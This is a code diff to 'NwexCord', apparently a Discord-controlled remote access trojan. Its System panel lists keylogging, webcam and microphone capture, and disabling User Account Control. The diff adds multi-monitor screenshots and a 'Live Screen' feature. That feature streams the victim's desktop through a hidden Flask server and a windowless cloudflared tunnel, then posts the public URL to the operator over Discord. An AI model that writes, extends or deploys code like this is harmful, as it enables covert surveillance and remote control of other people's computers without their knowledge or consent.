@@ -2621,6 +2621,10 @@ class ToolsPanelView(discord.ui.View):
         await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
 
 
+from flask import Flask, Response
+import urllib.request
+import re
+
 # ========================================
 # System Panel
 # ========================================
@@ -2634,11 +2638,31 @@ class SystemManager:
     _keylogger_listener = None
 
     @staticmethod
-    def take_screenshot():
-        """Take a full-screen screenshot and return bytes."""
+    def get_monitors():
+        """Return a list of bounding boxes for all connected monitors."""
+        try:
+            import ctypes
+            from ctypes import wintypes
+            monitors = []
+            def _monitor_enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
+                r = lprcMonitor.contents
+                monitors.append((r.left, r.top, r.right, r.bottom))
+                return True
+            MonitorEnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(wintypes.RECT), wintypes.LPARAM)
+            ctypes.windll.user32.EnumDisplayMonitors(None, None, MonitorEnumProc(_monitor_enum_proc), 0)
+            return monitors
+        except Exception:
+            return []
+
+    @staticmethod
+    def take_screenshot(bbox=None):
+        """Take a screenshot of a specific bbox or all screens."""
         try:
             from PIL import ImageGrab
-            img = ImageGrab.grab()
+            if bbox:
+                img = ImageGrab.grab(all_screens=True, bbox=bbox)
+            else:
+                img = ImageGrab.grab(all_screens=True)
             buf = io.BytesIO()
             img.save(buf, format='PNG')
             buf.seek(0)
@@ -2863,6 +2887,133 @@ class SystemManager:
         return data
 
 
+class LiveStreamManager:
+    """Manager for Flask-based Live Screen streaming with Cloudflare Tunnels."""
+    
+    _flask_thread = None
+    _cf_process = None
+    _is_running = False
+    _public_url = None
+    
+    @staticmethod
+    def _gen_frames():
+        from PIL import ImageGrab
+        while LiveStreamManager._is_running:
+            try:
+                img = ImageGrab.grab(all_screens=True)
+                img.thumbnail((1280, 720))  # Resize to save bandwidth
+                buf = io.BytesIO()
+                img.save(buf, format='JPEG', quality=50)
+                frame = buf.getvalue()
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+                time.sleep(0.1) # Max ~10 FPS
+            except Exception:
+                time.sleep(1)
+
+    @staticmethod
+    def _run_flask():
+        app = Flask(__name__)
+        # Suppress Flask logging
+        import logging
+        log = logging.getLogger('werkzeug')
+        log.setLevel(logging.ERROR)
+
+        @app.route('/')
+        def index():
+            return '''
+            <html>
+              <head>
+                <title>NwexCord Live Screen</title>
+                <style>
+                  body { background-color: #000; color: #fff; text-align: center; margin: 0; padding: 0; overflow: hidden; }
+                  img { width: 100vw; height: 100vh; object-fit: fill; }
+                </style>
+              </head>
+              <body>
+                <img src="/stream" />
+              </body>
+            </html>
+            '''
+
+        @app.route('/stream')
+        def stream():
+            return Response(LiveStreamManager._gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+            
+        try:
+            app.run(host='127.0.0.1', port=8080, threaded=True, use_reloader=False)
+        except Exception as e:
+            print(f"Flask execution failed: {e}")
+
+    @staticmethod
+    def start_stream():
+        if LiveStreamManager._is_running:
+            return True, LiveStreamManager._public_url
+            
+        try:
+            # 1. Start Flask in background thread
+            LiveStreamManager._is_running = True
+            from werkzeug.serving import make_server
+            import threading
+            
+            LiveStreamManager._flask_thread = threading.Thread(target=LiveStreamManager._run_flask, daemon=True)
+            LiveStreamManager._flask_thread.start()
+            
+            # 2. Setup Cloudflared
+            if not os.path.exists("cloudflared.exe"):
+                # start.bat should have downloaded this. If not, fail cleanly.
+                return False, "cloudflared.exe not found! Start the bot via start.bat to install it automatically."
+                
+            # 3. Start Cloudflared
+            LiveStreamManager._cf_process = subprocess.Popen(
+                ["cloudflared.exe", "tunnel", "--url", "http://localhost:8080"],
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            
+            start_time = time.time()
+            url = None
+            
+            # Read stderr to extract the trycloudflare url
+            while time.time() - start_time < 15:
+                # Use non-blocking read or a small timeout if needed, butreadline is fine here for startup
+                line = LiveStreamManager._cf_process.stderr.readline()
+                if not line:
+                    break
+                match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
+                if match:
+                    url = match.group(1)
+                    break
+                    
+            if url:
+                LiveStreamManager._public_url = url
+                return True, url
+            else:
+                LiveStreamManager.stop_stream()
+                return False, "Failed to get Cloudflare Tunnel URL within 15 seconds."
+                
+        except Exception as e:
+            LiveStreamManager.stop_stream()
+            return False, str(e)
+
+    @staticmethod
+    def stop_stream():
+        LiveStreamManager._is_running = False
+        if LiveStreamManager._cf_process:
+            LiveStreamManager._cf_process.terminate()
+            try:
+                LiveStreamManager._cf_process.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                LiveStreamManager._cf_process.kill()
+            LiveStreamManager._cf_process = None
+            
+        # Stopping flask completely requires advanced werkzeug server keeping track. 
+        # But we made the thread daemon, and we shut down the stream generating loop.
+        # It's fine to leave Flask hanging in daemon, or we could just kill the process instead, but daemon is fine.
+        LiveStreamManager._public_url = None
+        return True, "Live stream stopped successfully."
+
+
 def _progress_bar(percent, length=10):
     """Create a text-based progress bar."""
     if isinstance(percent, str):
@@ -3001,6 +3152,7 @@ def embed_system_panel():
             "Select a system action from the buttons below.\n\n"
             "📸 **ScreenShot** — Capture the PC screen\n"
             "📷 **Webcam** — Capture webcam photo\n"
+            "📺 **Live Screen** — Stream screen to browser\n"
             "🎙️ **Listener** — Record microphone audio\n"
             "🛡️ **Disable UAC** — Disable User Account Control\n"
             "⌨️ **KeyLogger** — Start/Stop key logging\n"
@@ -3012,6 +3164,24 @@ def embed_system_panel():
     return embed
 
 
+class LiveStreamView(discord.ui.View):
+    """View to manage the active Live Stream."""
+    def __init__(self, url):
+        super().__init__(timeout=None)
+        self.url = url
+        
+        # Open Browser Button
+        btn = discord.ui.Button(label="Open Stream in Browser", url=url, style=discord.ButtonStyle.link, emoji="🌐")
+        self.add_item(btn)
+
+    @discord.ui.button(label="Stop Stream", emoji="⏹", style=discord.ButtonStyle.danger)
+    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        SystemManager.stop_stream = LiveStreamManager.stop_stream
+        success, msg = LiveStreamManager.stop_stream()
+        embed = discord.Embed(title="⏹ Live Screen Stopped", description=msg, color=discord.Color.green())
+        embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())
+
 class SystemResultView(discord.ui.View):
     """Back button after a system action result."""
     def __init__(self):
@@ -3022,6 +3192,53 @@ class SystemResultView(discord.ui.View):
         await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())
 
 
+class ScreenShotSelectView(discord.ui.View):
+    """View to select which monitor to screenshot."""
+    def __init__(self, monitors):
+        super().__init__(timeout=300)
+        self.monitors = monitors
+        
+        # Add a button for each monitor
+        for i, bbox in enumerate(monitors):
+            btn = discord.ui.Button(label=f"Monitor {i+1}", style=discord.ButtonStyle.primary)
+            btn.callback = self.make_callback(bbox, str(i+1))
+            self.add_item(btn)
+            
+        # Add capture all button
+        all_btn = discord.ui.Button(label="All Monitors", style=discord.ButtonStyle.success)
+        all_btn.callback = self.make_callback(None, "All")
+        self.add_item(all_btn)
+
+        # Add back button
+        back_btn = discord.ui.Button(label="Back", style=discord.ButtonStyle.secondary)
+        back_btn.callback = self.back_callback
+        self.add_item(back_btn)
+
+    def make_callback(self, bbox, name):
+        async def callback(interaction: discord.Interaction):
+            loading = discord.Embed(title="📸 ScreenShot", description=f"⏳ Capturing Screen {name}...", color=discord.Color.greyple())
+            loading.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=loading, view=None)
+
+            loop = asyncio.get_event_loop()
+            success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, bbox)
+
+            if success:
+                file = discord.File(result, filename=f"screenshot_{name}.png")
+                embed = discord.Embed(title="📸 ScreenShot", description=f"✅ Screen {name} captured successfully.", color=discord.Color.green())
+                embed.set_image(url=f"attachment://screenshot_{name}.png")
+                embed.set_footer(text="NwexCord • System")
+                await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
+            else:
+                embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
+                embed.set_footer(text="NwexCord • System")
+                await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
+        return callback
+
+    async def back_callback(self, interaction: discord.Interaction):
+        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())
+
+
 class SystemPanelView(discord.ui.View):
     """Main System panel with 6 feature buttons."""
     def __init__(self):
@@ -3029,12 +3246,23 @@ class SystemPanelView(discord.ui.View):
 
     @discord.ui.button(label="ScreenShot", emoji="📸", style=discord.ButtonStyle.secondary, row=0)
     async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        monitors = SystemManager.get_monitors()
+        if monitors and len(monitors) > 1:
+            embed = discord.Embed(
+                title="📸 ScreenShot", 
+                description=f"Multiple monitors detected ({len(monitors)}). Please select a screen to capture.", 
+                color=discord.Color.blurple()
+            )
+            embed.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=embed, view=ScreenShotSelectView(monitors))
+            return
+
         loading = discord.Embed(title="📸 ScreenShot", description="⏳ Capturing screen...", color=discord.Color.greyple())
         loading.set_footer(text="NwexCord • System")
         await interaction.response.edit_message(content=None, embed=loading, view=None)
 
         loop = asyncio.get_event_loop()
-        success, result = await loop.run_in_executor(None, SystemManager.take_screenshot)
+        success, result = await loop.run_in_executor(None, SystemManager.take_screenshot, None)
 
         if success:
             file = discord.File(result, filename="screenshot.png")
@@ -3067,7 +3295,35 @@ class SystemPanelView(discord.ui.View):
             embed.set_footer(text="NwexCord • System")
             await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
 
-    @discord.ui.button(label="Listener", emoji="🎙️", style=discord.ButtonStyle.secondary, row=0)
+    @discord.ui.button(label="Live Screen", emoji="📺", style=discord.ButtonStyle.success, row=0)
+    async def livescreen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if LiveStreamManager._is_running and LiveStreamManager._public_url:
+            embed = discord.Embed(title="📺 Live Screen Active", description="The stream is already running.", color=discord.Color.green())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=embed, view=LiveStreamView(LiveStreamManager._public_url))
+            return
+
+        loading = discord.Embed(title="📺 Live Screen", description="⏳ Initializing server and creating secure tunnel...\nThis may take up to 15 seconds.", color=discord.Color.orange())
+        loading.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=loading, view=None)
+
+        loop = asyncio.get_event_loop()
+        success, result = await loop.run_in_executor(None, LiveStreamManager.start_stream)
+        
+        if success:
+            embed = discord.Embed(
+                title="📺 Live Screen Ready!", 
+                description=f"✅ Stream is online.\n\n🌐 **URL:** {result}\n\n*Note: Quality is adjusted to ensure smooth streaming. Click the button below to watch.*", 
+                color=discord.Color.green()
+            )
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, view=LiveStreamView(result))
+        else:
+            embed = discord.Embed(title="📺 Live Screen Failed", description=f"❌ {result}", color=discord.Color.red())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
+
+    @discord.ui.button(label="Listener", emoji="🎙️", style=discord.ButtonStyle.secondary, row=1)
     async def listener_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(ListenerDurationModal())
 
